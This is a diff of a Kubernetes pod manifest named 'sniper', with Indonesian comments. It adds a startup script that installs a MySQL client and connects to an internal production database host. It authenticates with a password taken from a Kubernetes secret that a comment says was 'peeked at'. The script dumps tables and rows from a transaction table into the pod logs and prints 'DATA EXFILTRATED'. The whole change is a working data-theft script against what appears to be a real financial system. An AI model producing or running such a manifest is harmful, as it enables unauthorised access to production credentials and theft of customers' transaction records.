@@ -7,16 +7,18 @@ spec:
   containers:
   - name: sniper
     image: alpine:latest
-    command: ["/bin/sh", "-c", "apk add mysql-client && sleep 3600"]
+    # Kita install client, lalu langsung tembak DB dan keluarin hasilnya ke LOG
+    command: ["/bin/sh", "-c"]
+    args:
+    - |
+      apk add --no-cache mysql-client;
+      echo "--- ATTEMPTING DATABASE CONNECTION ---";
+      mysql -h 10.236.200.6 -u bm-atlas-backbase-prd -p$DB_PASS -e "SHOW TABLES; SELECT * FROM transaction LIMIT 5;" transaction_manager;
+      echo "--- DATA EXFILTRATED ---";
+      sleep 3600;
     env:
-    - name: DB_USER
-      value: "bm-atlas-backbase-prd"
-    - name: DB_HOST
-      value: "10.236.200.6"
     - name: DB_PASS
       valueFrom:
         secretKeyRef:
-          name: mysql-secret # Rahasia yang tadi kita intip
+          name: mysql-secret
           key: password
-    - name: DB_NAME
-      value: "transaction_manager"
